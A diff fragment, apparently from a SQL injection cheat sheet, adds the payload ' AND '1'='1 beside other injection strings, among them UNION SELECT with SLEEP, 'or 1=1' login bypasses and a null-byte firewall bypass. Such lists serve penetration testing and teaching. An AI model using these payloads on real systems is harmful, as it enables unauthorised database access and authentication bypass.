@@ -30,6 +30,8 @@ asd</script>') UNION SELECT 1,SLEEP(10),3,4,5-- - >> Via file upload vulnerabili
 1') or 1=1-- -
 
 1' or 1=1-- -%00 >> For bypassing firewall.
+
+' AND '1'='1
 ```
 ### Parameter Testing For Time Based Blind
 ```sql
